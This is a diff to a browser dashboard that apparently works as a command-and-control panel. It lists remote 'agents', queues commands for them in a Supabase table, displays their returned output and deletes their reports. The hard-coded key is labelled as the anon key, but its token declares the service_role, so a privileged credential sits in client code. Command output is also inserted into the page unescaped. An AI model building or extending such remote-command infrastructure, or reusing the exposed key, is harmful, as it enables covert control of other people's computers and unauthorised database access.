@@ -148,8 +148,13 @@ body { background: #0a0a0a; color: #ccc; font-family: 'Segoe UI', monospace; }
 <div id="toast"></div>
 
 <script>
+// ============================================
+// USE ANON KEY (starts with eyJ...) - NOT service_role or secret key
+// Get this from: Supabase Dashboard -> Settings -> API -> Project API keys -> anon public
+// ============================================
 const SUPABASE_URL = "https://jojyzviwhosnnkjbtbse.supabase.co";
 const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Impvanl6dml3aG9zbm5ramJ0YnNlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3OTEzNTY5OCwiZXhwIjoyMDk0NzExNjk4fQ.JJmSBTBud2RVraJI0Bln26ZofK0xmMWWgaBzeAF5RMs";
+
 const { createClient } = supabase;
 const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
@@ -287,8 +292,12 @@ function updateStats() {
 }
 
 async function updateCmdStats() {
-    const { count } = await sb.from('pc_commands').select('*', { count: 'exact', head: true });
-    document.getElementById('stat-cmds').innerText = count || 0;
+    try {
+        const { count } = await sb.from('pc_commands').select('*', { count: 'exact', head: true });
+        document.getElementById('stat-cmds').innerText = count || 0;
+    } catch(e) {
+        document.getElementById('stat-cmds').innerText = '0';
+    }
 }
 
 // Command functions
@@ -330,23 +339,25 @@ async function sendCommand() {
 
 async function pollCommandOutput() {
     if (!selectedAgent) return;
-    const { data, error } = await sb.from('pc_commands')
-        .select('*')
-        .eq('command_for', selectedAgent)
-        .eq('status', 'completed')
-        .order('created_at', { ascending: false })
-        .limit(3);
-    
-    if (!error && data && data.length) {
-        const outputDiv = document.getElementById('cmd-output');
-        for (const cmd of data.reverse()) {
-            const marker = `CMD_ID:${cmd.id}`;
-            if (!outputDiv.innerHTML.includes(marker)) {
-                outputDiv.innerHTML += `\n📡 OUTPUT (${new Date(cmd.created_at).toLocaleTimeString()}):\n${cmd.output || '(no output)'}\n${'-'.repeat(50)}\n`;
-                outputDiv.scrollTop = outputDiv.scrollHeight;
+    try {
+        const { data, error } = await sb.from('pc_commands')
+            .select('*')
+            .eq('command_for', selectedAgent)
+            .eq('status', 'completed')
+            .order('created_at', { ascending: false })
+            .limit(3);
+        
+        if (!error && data && data.length) {
+            const outputDiv = document.getElementById('cmd-output');
+            for (const cmd of data.reverse()) {
+                const marker = `CMD_ID:${cmd.id}`;
+                if (!outputDiv.innerHTML.includes(marker)) {
+                    outputDiv.innerHTML += `\n📡 OUTPUT (${new Date(cmd.created_at).toLocaleTimeString()}):\n${cmd.output || '(no output)'}\n${'-'.repeat(50)}\n`;
+                    outputDiv.scrollTop = outputDiv.scrollHeight;
+                }
             }
         }
-    }
+    } catch(e) {}
 }
 
 function clearOutput() {
@@ -372,30 +383,24 @@ async function deleteAllFiltered() {
 async function confirmDelete() {
     if (pendingDeleteId) {
         // Delete single agent
-        const { error: deleteReports } = await sb.from('pc_reports').delete().eq('visitor_id', pendingDeleteId);
-        const { error: deleteCommands } = await sb.from('pc_commands').delete().eq('command_for', pendingDeleteId);
+        await sb.from('pc_reports').delete().eq('visitor_id', pendingDeleteId);
+        await sb.from('pc_commands').delete().eq('command_for', pendingDeleteId);
         
-        if (!deleteReports && !deleteCommands) {
-            toast(`Agent deleted`);
-            if (selectedAgent === pendingDeleteId) {
-                selectedAgent = null;
-                document.getElementById('cmd-panel').style.display = 'none';
-            }
-            await fetchAgents();
-        } else {
-            toast('Delete failed');
+        toast(`Agent deleted`);
+        if (selectedAgent === pendingDeleteId) {
+            selectedAgent = null;
+            document.getElementById('cmd-panel').style.display = 'none';
         }
+        await fetchAgents();
         pendingDeleteId = null;
     } else if (pendingDeleteAll) {
         // Delete all filtered agents
         const ids = filteredAgents.map(a => a.visitor_id);
-        let deleted = 0;
         for (const id of ids) {
             await sb.from('pc_reports').delete().eq('visitor_id', id);
             await sb.from('pc_commands').delete().eq('command_for', id);
-            deleted++;
         }
-        toast(`Deleted ${deleted} agents`);
+        toast(`Deleted ${ids.length} agents`);
         if (selectedAgent && ids.includes(selectedAgent)) {
             selectedAgent = null;
             document.getElementById('cmd-panel').style.display = 'none';
